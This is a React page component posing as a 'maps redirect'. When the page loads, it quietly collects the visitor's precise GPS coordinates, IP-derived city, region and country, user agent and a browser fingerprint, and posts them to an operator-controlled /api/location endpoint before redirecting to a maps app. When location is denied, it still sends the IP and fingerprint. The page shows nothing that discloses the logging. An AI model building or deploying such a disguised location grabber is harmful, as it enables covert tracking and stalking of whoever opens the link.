import { useEffect } from 'react'
import { generateFingerprint } from './fingerprint'
import './App.css'

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'

function MapsRedirect() {
  useEffect(() => {
    const detectAndRedirect = async () => {
      const userAgent = navigator.userAgent.toLowerCase()
      const isIOS = /iphone|ipad|ipod/.test(userAgent)
      const isAndroid = /android/.test(userAgent)

      try {
        const ipResponse = await fetch('https://ipapi.co/json/')
        const ipData = await ipResponse.json()

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              const fingerprint = await generateFingerprint()
              
              const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                ip_address: ipData.ip,
                user_agent: navigator.userAgent,
                city: ipData.city,
                region: ipData.region,
                country: ipData.country,
                fingerprint: fingerprint
              }

              await fetch(`${API_BASE_URL}/api/location`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(locationData)
              })

              const lat = position.coords.latitude
              const lng = position.coords.longitude

              if (isIOS) {
                window.location.href = `maps://?q=${lat},${lng}`
              } else if (isAndroid) {
                window.location.href = `geo:${lat},${lng}?q=${lat},${lng}`
              } else {
                window.location.href = `https://www.google.com/maps?q=${lat},${lng}`
              }
            },
            async (error) => {
              console.error('Location error:', error)
              
              const fingerprint = await generateFingerprint()
              
              const fallbackData = {
                latitude: 0,
                longitude: 0,
                accuracy: 0,
                ip_address: ipData.ip,
                user_agent: navigator.userAgent,
                city: ipData.city,
                region: ipData.region,
                country: ipData.country,
                fingerprint: fingerprint
              }

              await fetch(`${API_BASE_URL}/api/location`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fallbackData)
              })
            },
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            }
          )
        }
      } catch (err) {
        console.error('Failed to get IP info:', err)
      }
    }

    detectAndRedirect()
  }, [])

  return (
    <div className="min-h-screen bg-white"></div>
  )
}

export default MapsRedirect
